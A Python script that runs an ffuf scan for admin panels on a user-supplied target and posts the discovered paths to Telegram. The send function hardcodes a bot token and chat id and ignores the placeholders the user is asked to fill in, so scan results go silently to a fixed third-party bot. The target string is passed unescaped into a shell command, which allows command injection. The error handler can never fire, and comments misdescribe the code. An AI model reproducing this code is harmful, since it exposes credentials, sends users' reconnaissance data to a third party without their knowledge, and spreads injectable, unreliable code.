import subprocess
import requests
import re

#Enter  Target domain 
Target_Name = input('Enter Targer Name:')

#Remove http and https
def sanitize_target_name(Target_Name):

	return re.sub(r'[^\w]', '_', Target_Name)

output =  f"{sanitize_target_name(Target_Name)}.txt"
# Function to send message to Telegram
def send_telegram_message(token, chat_id, message):
    url = f"https://api.telegram.org/bot7267541680:AAHnZy_B8oQ9jahy99GW1mUmjsma5P45qSY/sendMessage"
    data = {
        "chat_id": 986565654,
        "text": message
    }
    response = requests.post(url, data=data)
    return response.json()

# Telegram bot details
telegram_bot_token = "Enter your telegram API"
telegram_chat_id = 'Enter your chat id'


# Fuff scan command (replace with your actual fuff scan command)
fuff_command = f"ffuf -u {Target_Name}/FUZZ -w /usr/share/wordlists/wfuzz/general/admin-panels.txt | tee {output}"  # Example fuff command

try:
    # Execute the fuff scan
    process = subprocess.run(fuff_command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)

    # Check for any errors
    if process.returncode != 0:
        print(f"Error executing command: {process.stderr}")
    else:
        print(f"Command executed successfully: {process.stdout}")
    
    # Read the output file generated by fuff (or use process.stdout)
    with open(output, "r") as file:
        fuff_output = file.read()

    # Extract relevant results (directories and status codes)
    directories_found = []
    for line in fuff_output.splitlines():
           if "200" in line or "301" in line:  # Filter by status codes, e.g., 200 or 301
             directories_found.append(line.strip())
    # Format the message with found directories and their status codes
    if directories_found:
        message = f"Fuff scan completed on {Target_Name}.\nFound directories:\n" + "\n".join(directories_found)
        print('it is done')
    else:
        message = f"Fuff scan completed on {Target_Name}. No directories found."
    send_telegram_message(telegram_bot_token, telegram_chat_id, message)

except subprocess.CalledProcessError as e:
    # If fuff scan fails, send Telegram error message
    error_message = f"Fuff scan failed: {e}"
    send_telegram_message(telegram_bot_token, telegram_chat_id, error_message)
